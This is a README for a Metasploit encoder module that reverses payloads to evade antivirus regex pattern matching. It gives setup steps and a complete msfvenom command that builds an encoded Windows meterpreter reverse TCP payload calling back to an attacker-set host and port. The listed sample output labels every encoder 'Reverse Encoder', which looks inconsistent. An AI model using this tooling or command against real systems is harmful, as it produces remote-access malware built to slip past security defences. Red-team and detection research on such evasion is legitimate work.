# Metasploit_ReverseEncoder
Generic Metasploit Encoder that simply reverses the payload to avoid AV RegEx Pattern Matching 

## Setup
Place the *.rb file inside "/usr/share/metasploit-framework/modules/encoders/generic" folder.

## Sample Usage

Try this to verify that Metasploit finds the encoder:
	msfvenom --list encoders

The resulting output should contain the following line

	generic/reverse              normal     Reverse Encoder
	generic/shuffle              normal     Reverse Encoder
	generic/naturalword          normal     Reverse Encoder


Now encode your payload with -e generic/reverse, eg;

	msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=wlan0 LPORT=4444 -e generic/reverse -f raw -o payload.raw

## Limitations:

This encoder only works with Framework Transform Formats (see msfvenom --list formats) and you need to provide your own decoder as part of the payload executable creation
